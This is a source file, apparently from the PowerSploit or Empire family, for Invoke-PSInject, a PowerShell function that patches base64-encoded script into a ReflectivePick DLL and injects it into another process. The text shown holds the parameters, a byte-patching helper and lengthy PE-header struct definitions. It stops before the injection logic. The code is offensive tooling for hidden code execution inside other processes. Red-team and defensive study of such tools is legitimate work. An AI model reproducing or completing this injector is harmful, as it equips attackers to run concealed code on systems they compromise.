function Invoke-PSInject
{
 <#
.SYNOPSIS
Taskes a PowerShell script block (base64-encoded), patches
the decoded logic into the architecture appropriate ReflectivePick
.dll, and injects the result into a specified ProcessID.

Adapted from PowerSploit's Invoke-RefleciveDLLInjection codebase

.PARAMETER ProcId
Process to inject ReflectivePick into

.PARAMETER PoshCode
Base64-encoded PowerShell code to inject.
#>


[CmdletBinding(DefaultParameterSetName="WebFile")]
Param(
    
    [Parameter(Position = 1)]
    [String[]]
    $ComputerName,
    
    [Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void', 'Other' )]
    [String]
    $FuncReturnType = 'Other',
    
    [Parameter(Position = 3)]
    [String]
    $ExeArgs,
    
    [Parameter(Position = 4)]
    [Int32]
    $ProcId,
    
    [Parameter(Position = 5)]
    [String]
    $ProcName,
    
    [Parameter(Position = 6, Mandatory = $true)]
    [ValidateLength(1,1200)]
    [String]
    $PoshCode,

    [Parameter(Position = 7)]
    [Switch]
    $ForceASLR
)

    Set-StrictMode -Version 2

    # decode the base64 script block
    $PoshCode = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($PoshCode));

    function Invoke-PatchDll {
        <#
        .SYNOPSIS
        Patches a string in a binary byte array.

        .PARAMETER DllBytes
        Binary blog to patch.

        .PARAMETER FindString
        String to search for to replace.

        .PARAMETER ReplaceString
        String to replace FindString with
        #>

        [CmdletBinding()]
        param(
            [Parameter(Mandatory = $True)]
            [Byte[]]
            $DllBytes,

            [Parameter(Mandatory = $True)]
            [string]
            $FindString,

            [Parameter(Mandatory = $True)]
            [string]
            $ReplaceString
        )

        $FindStringBytes = ([system.Text.Encoding]::UNICODE).GetBytes($FindString)
        $ReplaceStringBytes = ([system.Text.Encoding]::UNICODE).GetBytes($ReplaceString)

        $index = 0
        $s = [System.Text.Encoding]::UNICODE.GetString($DllBytes)
        $index = $s.IndexOf($FindString) * 2
        Write-Verbose "patch index: $index"

        if($index -eq 0)
        {
            throw("Could not find string $FindString !")
        }

        for ($i=0; $i -lt $ReplaceStringBytes.Length; $i++)
        {
            $DllBytes[$index+$i]=$ReplaceStringBytes[$i]
        }

        # null terminate the replaced string
        $DllBytes[$index+$ReplaceStringBytes.Length] = [byte]0x00
        $DllBytes[$index+$ReplaceStringBytes.Length+1] = [byte]0x00

        $replacestart = $index
        $replaceend = $index + $ReplaceStringBytes.Length
        write-verbose "replacestart: $replacestart"
        write-verbose "replaceend: $replaceend"

        $NewCode=[System.Text.Encoding]::Unicode.GetString($RawBytes[$replacestart..$replaceend])
        write-verbose "Replaced pattern with: $NewCode"
        
        return $DllBytes
    }


$RemoteScriptBlock = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $PEBytes64,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $PEBytes32,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FuncReturnType,
                
        [Parameter(Position = 2, Mandatory = $true)]
        [Int32]
        $ProcId,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR,
        
        [Parameter(Position = 5, Mandatory = $true)]
        [String]
        $PoshCode
    )
    
    ###################################
    ##########  Win32 Stuff  ##########
    ###################################
    Function Get-Win32Types
    {
        $Win32Types = New-Object System.Object

        #Define all the structures/enums that will be used
        #   This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


        ############    ENUM    ############
        #Enum MachineType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $MachineType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

        #Enum MagicType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $MagicType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

        #Enum SubSystemType
        $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $SubSystemType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

        #Enum DllCharacteristicsType
        $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $DllCharacteristicsType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

        ###########    STRUCT    ###########
        #Struct IMAGE_DATA_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
        ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

        #Struct IMAGE_FILE_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

        #Struct IMAGE_OPTIONAL_HEADER64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
        $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

        #Struct IMAGE_OPTIONAL_HEADER32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

        #Struct IMAGE_NT_HEADERS64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
        $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
        
        #Struct IMAGE_NT_HEADERS32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
        $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

        #Struct IMAGE_DOS_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
        $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
        $e_resField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
        $e_res2Field.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()   
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

        #Struct IMAGE_SECTION_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

        $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

        #Struct IMAGE_BASE_RELOCATION
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

        #Struct IMAGE_IMPORT_DESCRIPTOR
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

        #Struct IMAGE_EXPORT_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
